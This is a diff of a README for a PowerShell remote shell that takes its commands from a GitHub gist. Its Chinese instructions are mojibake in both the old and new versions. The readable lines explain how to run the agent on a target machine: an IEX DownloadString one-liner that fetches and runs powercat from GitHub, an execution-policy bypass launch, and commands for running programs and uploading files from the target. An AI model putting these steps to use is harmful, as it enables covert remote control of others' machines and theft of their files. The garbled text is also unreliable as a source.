@@ -1,38 +1,38 @@
 #Powershell Github Shell
-#Author:zshell
-#Blog:http://www.0x7c.com
-#Github:https://github.com/zlocal/Powershell-Github-Shell
-#Demo Result Gist:https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e
+	###Author:zshell
+	###Blog:http://www.0x7c.com
+	###Github:https://github.com/zlocal/Powershell-Github-Shell
+	###Demo Result Gist:https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e
 
-Ê¹ÓÃ·½·¨£º
-1£¬´´½¨githubÕË»§£¬·ÃÎÊhttps://github.com/settings/tokens/new£¬Ñ¡ÖĞ gist   Create gists £¬´´½¨·ÃÎÊGistsµÄtoken.
-2, ·ÃÎÊ https://gist.github.com/ £¬´´½¨Ò»¸öGist£¬ÊôĞÔ×îºÃÎªprivate,Ö»ÓĞ×Ô¼ºÄÜ·ÃÎÊ²é¿´½á¹û£¬Ãû³ÆÎªcmd.Àı£º
-ÎªÁËÕ¹Ê¾£¬ÎÒÉèÖÃÁËpublic https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e
+ä½¿ç”¨æ–¹æ³•ï¼š
+1ï¼Œåˆ›å»ºgithubè´¦æˆ·ï¼Œè®¿é—®https://github.com/settings/tokens/newï¼Œé€‰ä¸­ gist   Create gists ï¼Œåˆ›å»ºè®¿é—®Gistsçš„token.
+2, è®¿é—® https://gist.github.com/ ï¼Œåˆ›å»ºä¸€ä¸ªGistï¼Œå±æ€§æœ€å¥½ä¸ºprivate,åªæœ‰è‡ªå·±èƒ½è®¿é—®æŸ¥çœ‹ç»“æœï¼Œåç§°ä¸ºcmd.ä¾‹ï¼š
+ä¸ºäº†å±•ç¤ºï¼Œæˆ‘è®¾ç½®äº†public https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e
 	Command:"time /T"
 	ReadFile:"c:/windows/temp/1.txt"
 	WriteFile:"http://www.github.com/raw/1.zip c:/wnidows/temp/2.txt"
 	Powershell:"Get-Process | Out-String"
 	Command:"whoami"
-ÆäÖĞ
-CommandºóÊÇÏëÒªÖ´ĞĞµÄcmdÃüÁî£¬¹¦ÄÜÒÑ²âÊÔOK
-ReadFileÊÇÉÏ´«Ä¿±ê»úÆ÷ÉÏµÄÎÄ¼şµ½Github£¬ÔİÎ´ÊµÏÖ
-WriteFileÏÂÔØÎÄ¼şµ½Ä¿±ê»úÆ÷£¬ÔİÎ´ÊµÏÖ
-PowershellºóÊÇ¿ÉÒÔÖ´ĞĞµÄPowershellÖ¸Áî£¬ÔİÎ´ÊµÏÖ
+å…¶ä¸­
+Commandåæ˜¯æƒ³è¦æ‰§è¡Œçš„cmdå‘½ä»¤ï¼ŒåŠŸèƒ½å·²æµ‹è¯•OK
+ReadFileæ˜¯ä¸Šä¼ ç›®æ ‡æœºå™¨ä¸Šçš„æ–‡ä»¶åˆ°Githubï¼Œæš‚æœªå®ç°
+WriteFileä¸‹è½½æ–‡ä»¶åˆ°ç›®æ ‡æœºå™¨ï¼Œæš‚æœªå®ç°
+Powershellåæ˜¯å¯ä»¥æ‰§è¡Œçš„PowershellæŒ‡ä»¤ï¼Œæš‚æœªå®ç°
 
-2, ĞŞ¸ÄPowershell½Å±¾µÄÍ·²¿ÅäÖÃĞÅÏ¢
-$gistsUser="gitusername";		# githubµÄÓÃ»§Ãû
-$gistsApiToken="gittoken";		# ÉÏ²½ÖĞµÃµ½µÄtoken £¬Àıeed4239e439034a92fc4cbe0fbd2ca906999a9f1
-$checkTime=60;				# Ã¿´Î»ñÈ¡ÃüÁî½á¹ûĞèÒªµÈ´ıµÄÊ±¼ä£¬ÃëÎªµ¥Î»
+2, ä¿®æ”¹Powershellè„šæœ¬çš„å¤´éƒ¨é…ç½®ä¿¡æ¯
+$gistsUser="gitusername";		# githubçš„ç”¨æˆ·å
+$gistsApiToken="gittoken";		# ä¸Šæ­¥ä¸­å¾—åˆ°çš„token ï¼Œä¾‹eed4239e439034a92fc4cbe0fbd2ca906999a9f1
+$checkTime=60;				# æ¯æ¬¡è·å–å‘½ä»¤ç»“æœéœ€è¦ç­‰å¾…çš„æ—¶é—´ï¼Œç§’ä¸ºå•ä½
 
-3, Ê¹powershellÔÚÄ¿±ê»úÆ÷ÉÏÖ´ĞĞ
-PowershellÖ´ĞĞ·½·¨
-Ò»¾ä»°Ô¶³Ì¼ÓÔØ 
+3, ä½¿powershellåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œ
+Powershellæ‰§è¡Œæ–¹æ³•
+ä¸€å¥è¯è¿œç¨‹åŠ è½½ 
 powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 
-Ò»¾ä»°±¾µØ¼ÓÔØ
+ä¸€å¥è¯æœ¬åœ°åŠ è½½
 powershell IEX ([System.IO.File]::readAllText('PowershellGitShell.ps1'));
 
-Ò»¾ä»°ÎÄ¼şÖ´ĞĞ
+ä¸€å¥è¯æ–‡ä»¶æ‰§è¡Œ
 powershell -executionPolicy bypass -File "c:/test/PowershellGitShell.ps1"
 
-4£¬¿ÉÒÔĞŞ¸Äcmd gistµÄÄÚÈİ£¬ÔÚ$checkTimeÃëºóË¢ĞÂÍøÒ³£¬½á¹û»áÔÚÆÀÂÛÖĞ¡£½á¹ûĞèÒªÊ¹ÓÃURL DECODE½âÂë¡£
+4ï¼Œå¯ä»¥ä¿®æ”¹cmd gistçš„å†…å®¹ï¼Œåœ¨$checkTimeç§’ååˆ·æ–°ç½‘é¡µï¼Œç»“æœä¼šåœ¨è¯„è®ºä¸­ã€‚ç»“æœéœ€è¦ä½¿ç”¨URL DECODEè§£ç ã€‚
